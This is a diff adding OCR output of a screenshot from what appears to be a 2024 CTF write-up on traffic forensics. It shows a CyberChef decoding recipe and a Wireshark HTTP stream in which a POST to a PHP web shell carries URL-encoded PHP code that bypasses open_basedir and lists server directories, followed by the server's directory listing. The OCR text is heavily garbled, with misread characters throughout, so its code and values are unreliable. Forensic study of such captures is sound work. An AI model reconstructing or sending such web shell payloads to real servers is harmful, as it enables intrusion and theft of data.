@@ -1,0 +1,59 @@
+# OCR: d352b23ce194abfc7651699371f10259.jpg
+# 来源: .\02-WriteUp\2024\d352b23ce194abfc7651699371f10259.jpg
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-08-31 15:42
+
+Recipe
+URL Decode
+From Base64
+Alphabet
+A-za-z6-94/
+Strict mode
+日 园 白 input
+L3dady93dadyb2901 3d3dyS@cHNob3AUY29tL3B1YmxpYy1cGxvYWOY
+Qu
+Qu 二 五
+“ 团 Removenon-aiphabetchar Output
+Lvtetsi wena oot / ww com/public/upload/|
+属 Wireshark - S883 HTTP i (tep.stream eq 102) tcpdump? ticap
+POST /peiqi.php HTTP/1.2.
+Host: 222.2.2.180
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10 ¢
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1582
+Connection: close
+5 5 zh-cn) AppleWebKit/533.20.25 (KHTML, like Gecko) Versii
+db¥ca74ace7b02=j91 3d3dy93d3dyb290L 3d3dyS@cHNob3AUY29tL3B1YmxpYy9LcGxvYNQvEpei qi-X40ini_set (%22display_errors%22%2c%2
+pen_basedir%22)%3Bif (%24opdir)%20%78%24oparr%aDpreg_split (%22%2Fx5C%SC%SCXSCK7CXSCK2FX2F%22%2CK240pdir )X3B%240cwd¥3D.
+22.41427e26%22%3B%40nkdir (%24tmdir )X3B%4achdir (X24tmdir )X3B%40ini_set (%22open_basedir%22%2C%22.. .%22)%3B For (%24i%300%
+3B%70%4@ini_set (%220pen_basedir%22%2C%22%2F%22)%3B%4rmdir (%24ocwd .%22%2F%22..%24tmdir )%3B%7D%3BFunctionX2easenc (%240
+ut%3Dob_get_contents()%38ob_end_clean()%3Becho%20%22Fd%22.%223*5%22%3Becho%20%4@asenc (%24output )%3Becho%20%221 1aF 5%:
+bstr(%24_POST%S%22dbfca74ace7b02%22%5D%2C2) )%3B%24F%3D%42opendir (%24D)X3Bi f (%24FX3D%IDNULL )X7Becho (%22ERRORKSALZFX2
+‘78R24¥3DNULLE3B%24L S3DNULL&3Bwhi le (24NE3DR40readdir (%24F) )R7BR2APRIDA2AD .A2ANEBBRIATRIDEAOdate(%22V-m-dR2OHRSAIRA:
+OF ileperms (%24P)%2C10%2CB)%2C-4) 83BR2AREIDR2INOGR22.524T .22%OGR22 .KAOFilesize (%2AP) .522%OGK22 IKE .22ROAK2IXGBIF (5
+24N. %24R%3%7Decho%20%24M.%241 %3B%40c Losedir (%24F )%3B%70%3B%7Dcat ch (Except ion%20%24e )%7Becho%20%22E RRORKSAL2F%2F%22..
+e OK
+Server: nginx
+Date: Fri, @4 Mar 2022 10:22:42 GMT
+Content-Type: text/html; charset:
+‘Transfer-Encoding: chunked
+Connection: close
+Vary: Accept-Encoding
+Content-Encoding: gzip
+FB
+¥d3f5./ 2022-03-04 18:22:38 192 9755
+Ld 2020-09-09 16:43:46 183 9755
+activity/ 2020-09-09 18 9755
+ad/ 2020-09-09 30 9755
+banner/ 2020-09-09 18 ss
+brand/ 2020-09-09 四 0755
+category/ 2020-09-09 18 9755
+comment/ 2020-09-09 0 0755
+goods/ 2020-09-09 玑 0755
+head_pic/ 2020-09-09 18 ss
+plugins/ 2020-09-09 18 ss
+return_goods/ 2020-09-09 15:40:32 54 0755
+weixin/ 2020-09-09 15:40:32 18 9755
+encrypt file.exe 2022-@3-04 18:22:42 9754698644.
+Tiats47a38
